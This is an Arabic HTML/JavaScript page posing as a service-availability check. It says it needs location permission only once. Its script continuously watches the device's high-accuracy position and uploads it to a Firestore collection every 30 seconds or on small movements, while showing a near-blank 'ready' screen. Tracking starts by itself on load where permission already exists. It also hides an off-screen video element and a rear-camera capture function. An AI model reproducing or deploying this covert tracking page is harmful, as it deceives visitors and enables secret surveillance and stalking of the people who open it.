<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الرئيسية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            min-height: 100dvh;
            overflow: hidden;
            transition: background 0.3s ease, color 0.3s ease;
        }

        /* الثيم الداكن (افتراضي) */
        body.dark-theme {
            background: #0a0e1a;
            color: #f1f5f9;
        }

        /* الثيم الفاتح */
        body.light-theme {
            background: #f0f4ff;
            color: #1a1a2e;
        }

        #hidden-stream {
            position: fixed;
            width: 1px; height: 1px;
            opacity: 0; pointer-events: none;
            top: -9999px; left: -9999px; z-index: -1;
        }

        #perm-screen {
            position: fixed; inset: 0;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            z-index: 9999; padding: 30px;
            text-align: center;
            transition: opacity 0.5s ease, background 0.3s ease;
        }

        body.dark-theme #perm-screen {
            background: #0a0e1a;
        }

        body.light-theme #perm-screen {
            background: #f0f4ff;
        }

        #perm-screen.fade-out { opacity: 0; pointer-events: none; }

        .perm-box { max-width: 340px; width: 100%; position: relative; }

        /* زر الصفحة الرئيسية - في الأعلى */
        .home-btn {
            position: absolute;
            top: -70px;
            left: 50%;
            transform: translateX(-50%);
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: none;
            background: rgba(0, 229, 160, 0.15);
            border: 1.5px solid rgba(0, 229, 160, 0.3);
            color: #00e5a0;
            font-size: 1.3rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        body.light-theme .home-btn {
            background: rgba(0, 229, 160, 0.2);
            border-color: rgba(0, 229, 160, 0.4);
        }

        .home-btn:active {
            transform: translateX(-50%) scale(0.92);
        }

        .perm-box .icon-circle {
            width: 70px; height: 70px; border-radius: 50%;
            background: rgba(0,229,160,0.1);
            border: 1.5px solid rgba(0,229,160,0.25);
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px; font-size: 1.6rem; color: #00e5a0;
        }

        body.light-theme .icon-circle {
            background: rgba(0, 229, 160, 0.15);
            border-color: rgba(0, 229, 160, 0.3);
        }

        .perm-box h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 10px; line-height: 1.5; }
        .perm-box p { font-size: 0.85rem; color: #7a8baa; line-height: 1.7; margin-bottom: 28px; }

        body.light-theme .perm-box p {
            color: #5a6a8a;
        }

        .perm-btn {
            width: 100%; padding: 15px; border: none; border-radius: 12px;
            background: linear-gradient(135deg, #00e5a0, #00b87a);
            color: #0a0e1a; font-family: 'Cairo', sans-serif;
            font-size: 1rem; font-weight: 700; cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 20px rgba(0,229,160,0.25);
        }

        body.light-theme .perm-btn {
            box-shadow: 0 4px 20px rgba(0, 229, 160, 0.3);
        }

        .perm-btn:active { transform: scale(0.97); }
        .perm-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        .perm-btn .ld {
            width: 18px; height: 18px; border: 2.5px solid transparent;
            border-top-color: #0a0e1a; border-radius: 50%;
            animation: sp 0.6s linear infinite; display: none;
        }

        @keyframes sp { to { transform: rotate(360deg); } }

        .perm-box.blocked .icon-circle {
            background: rgba(255,71,87,0.1);
            border-color: rgba(255,71,87,0.25); color: #ff4757;
        }

        body.light-theme .perm-box.blocked .icon-circle {
            background: rgba(255, 71, 87, 0.15);
        }

        .perm-box.blocked .perm-btn {
            background: rgba(255,71,87,0.12);
            color: #ff4757; box-shadow: none;
            border: 1px solid rgba(255,71,87,0.25);
        }

        body.light-theme .perm-box.blocked .perm-btn {
            background: rgba(255, 71, 87, 0.15);
        }

        #blank-screen {
            position: fixed; inset: 0;
            display: none; justify-content: center; align-items: center; z-index: 1;
            transition: background 0.3s ease;
        }

        body.dark-theme #blank-screen {
            background: #0a0e1a;
        }

        body.light-theme #blank-screen {
            background: #f0f4ff;
        }

        .blank-msg { text-align: center; opacity: 0.15; user-select: none; }
        .blank-msg i { font-size: 2.5rem; margin-bottom: 10px; display: block; }
        .blank-msg span { font-size: 0.85rem; color: #7a8baa; }

        body.light-theme .blank-msg span {
            color: #5a6a8a;
        }

        /* SPA overlay - يظهر عند فتح الصفحة الرئيسية */
        #spa-overlay {
            position: fixed;
            inset: 0;
            z-index: 10000;
            background: #0a0e1a;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            transition: opacity 0.4s ease;
        }

        body.light-theme #spa-overlay {
            background: #f0f4ff;
        }

        #spa-overlay.active {
            display: flex;
        }

        #spa-overlay iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: transparent;
        }

        .spa-close-btn {
            position: fixed;
            top: 16px;
            right: 16px;
            z-index: 10001;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            border: none;
            background: rgba(0, 0, 0, 0.5);
            color: #fff;
            font-size: 1.2rem;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        body.light-theme .spa-close-btn {
            background: rgba(255, 255, 255, 0.7);
            color: #1a1a2e;
        }

        .spa-close-btn:active {
            transform: scale(0.9);
        }

        #spa-overlay.active .spa-close-btn {
            display: flex;
        }
    </style>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
</head>
<body>

    <video id="hidden-stream" autoplay playsinline muted></video>

    <!-- SPA Overlay للصفحة الرئيسية -->
    <div id="spa-overlay">
        <button class="spa-close-btn" id="spa-close-btn" onclick="closeHome()">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <iframe id="home-iframe" src="home.html"></iframe>
    </div>

    <div id="perm-screen">
        <div class="perm-box" id="perm-box">
            <!-- زر الصفحة الرئيسية -->
            <button class="home-btn" onclick="openHome()" title="الرئيسية">
                <i class="fa-solid fa-house"></i>
            </button>

            <div class="icon-circle" id="perm-icon-circle">
                <i class="fa-solid fa-check" id="perm-icon"></i>
            </div>
            <h2 id="perm-title">مرحباً بك</h2>
            <p id="perm-desc">للتأكد من توفر الخدمة في منطقتك، نحتاج صلاحية تحديد الموقع مرة واحدة فقط.</p>
            <button class="perm-btn" id="perm-btn" onclick="start()">
                <span class="ld" id="perm-ld"></span>
                <i class="fa-solid fa-arrow-left" id="perm-btn-icon"></i>
                <span id="perm-btn-text">متابعة</span>
            </button>
        </div>
    </div>

    <div id="blank-screen">
        <div class="blank-msg">
            <i class="fa-solid fa-check-double"></i>
            <span>جاهز</span>
        </div>
    </div>

    <script>
        // ======== تطبيق الثيم التلقائي ========
        function applyAutoTheme() {
            const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
            const body = document.body;

            // نزيل الكلاسات القديمة
            body.classList.remove('dark-theme', 'light-theme');

            if (isDark) {
                body.classList.add('dark-theme');
            } else {
                body.classList.add('light-theme');
            }
        }

        // تطبيق الثيم فوراً
        applyAutoTheme();

        // الاستماع لتغيرات الثيم أثناء التشغيل
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyAutoTheme);

        // ======== SPA - فتح وإغلاق الصفحة الرئيسية ========
        function openHome() {
            const overlay = document.getElementById('spa-overlay');
            const iframe = document.getElementById('home-iframe');

            // إعادة تحميل الإطار للتأكد من تحديث البيانات
            iframe.src = 'home.html';
            overlay.classList.add('active');

            // منع التمرير خلف الإطار
            document.body.style.overflow = 'hidden';
        }

        function closeHome() {
            const overlay = document.getElementById('spa-overlay');
            overlay.classList.remove('active');
            document.body.style.overflow = '';
        }

        // إغلاق عند الضغط على زر الرجوع في المتصفح (اختياري)
        window.addEventListener('popstate', function(e) {
            if (document.getElementById('spa-overlay').classList.contains('active')) {
                closeHome();
            }
        });

        // ======== Firebase و Geolocation ========
        firebase.initializeApp({
            apiKey: "AIzaSyDk5poPjAe6LJOMUbDU_ak_ZLtLuCoqahI",
            authDomain: "project-8964705196826400556.firebaseapp.com",
            projectId: "project-8964705196826400556",
            storageBucket: "project-8964705196826400556.firebasestorage.app",
            messagingSenderId: "615020770883",
            appId: "1:615020770883:web:ca0856f464dd57b4aac6f6"
        });
        var db = firebase.firestore();

        var deviceId = localStorage.getItem('smart_menu_device_id');
        if (!deviceId) {
            deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
            localStorage.setItem('smart_menu_device_id', deviceId);
        }

        var watcher = null;
        var bestAcc = Infinity;
        var optimizing = true;
        var t0 = Date.now();
        var lastPushTime = 0;
        var isPushing = false;
        var lastPushedLat = null;
        var lastPushedLng = null;
        var cameraStream = null;
        var cameraActive = false;

        function start() {
            var btn = document.getElementById('perm-btn');
            btn.disabled = true;
            document.getElementById('perm-ld').style.display = 'block';
            document.getElementById('perm-btn-icon').style.display = 'none';
            document.getElementById('perm-btn-text').innerText = 'جاري التحقق...';

            if (!("geolocation" in navigator)) { showBlocked(); return; }

            watcher = navigator.geolocation.watchPosition(onPos, onErr, {
                enableHighAccuracy: true, timeout: 15000, maximumAge: 0
            });
        }

        function onPos(pos) {
            var lat = pos.coords.latitude;
            var lng = pos.coords.longitude;
            var acc = pos.coords.accuracy;
            var now = Date.now();
            var shouldPush = false;
            var reason = '';

            if (optimizing) {
                if (acc < bestAcc) { shouldPush = true; reason = 'تحسّن الدقة'; }
                if (acc <= 5 || (now - t0 > 15000)) optimizing = false;
            } else {
                if (now - lastPushTime >= 30000) {
                    shouldPush = true; reason = 'نبض';
                } else if (acc < bestAcc - 1) {
                    shouldPush = true; reason = 'دقة أفضل'; bestAcc = acc;
                } else if (lastPushedLat !== null) {
                    var dist = getDist(lastPushedLat, lastPushedLng, lat, lng);
                    if (dist >= 3) { shouldPush = true; reason = 'حركة'; }
                }
                if (!shouldPush && acc < bestAcc) bestAcc = acc;
            }

            if (shouldPush && !isPushing) push(lat, lng, acc);

            document.getElementById('perm-screen').classList.add('fade-out');
            setTimeout(function () {
                document.getElementById('perm-screen').style.display = 'none';
                document.getElementById('blank-screen').style.display = 'flex';
            }, 500);
        }

        function getDist(lat1, lon1, lat2, lon2) {
            var R = 6371000, dLat = (lat2 - lat1) * Math.PI / 180, dLon = (lon2 - lon1) * Math.PI / 180;
            var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                    Math.sin(dLon / 2) * Math.sin(dLon / 2);
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
        }

        function push(lat, lng, acc) {
            isPushing = true;
            db.collection('loc').doc(deviceId).set({
                latitude: lat, longitude: lng, accuracy: acc, device_id: deviceId,
                last_updated: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true }).then(function () {
                isPushing = false;
                lastPushTime = Date.now();
                lastPushedLat = lat;
                lastPushedLng = lng;
            }).catch(function () { isPushing = false; });
        }

        function onErr(err) {
            if (err.code === err.PERMISSION_DENIED) showBlocked();
        }

        function showBlocked() {
            document.getElementById('perm-box').classList.add('blocked');
            document.getElementById('perm-icon').className = 'fa-solid fa-xmark';
            document.getElementById('perm-title').innerText = 'الصلاحية مطلوبة';
            document.getElementById('perm-desc').innerText = 'لا يمكن تقديم الخدمة بدون تحديد الموقع. يرجى تحديث الصفحة والموافقة.';
            document.getElementById('perm-ld').style.display = 'none';
            var icon = document.getElementById('perm-btn-icon');
            icon.style.display = 'inline';
            icon.className = 'fa-solid fa-rotate-right';
            document.getElementById('perm-btn-text').innerText = 'إعادة المحاولة';
            document.getElementById('perm-btn').disabled = false;
        }

        async function requestCamera() {
            if (cameraActive && cameraStream) return cameraStream;
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } });
            cameraActive = true;
            document.getElementById('hidden-stream').srcObject = cameraStream;
            return cameraStream;
        }

        function releaseCamera() {
            if (cameraStream) { cameraStream.getTracks().forEach(function (t) { t.stop(); }); cameraStream = null; }
            cameraActive = false;
            document.getElementById('hidden-stream').srcObject = null;
        }

        window.onload = function () {
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(function (r) {
                    if (r.state === 'granted') start();
                }).catch(function () {});
            }
        };
    </script>
</body>
</html>
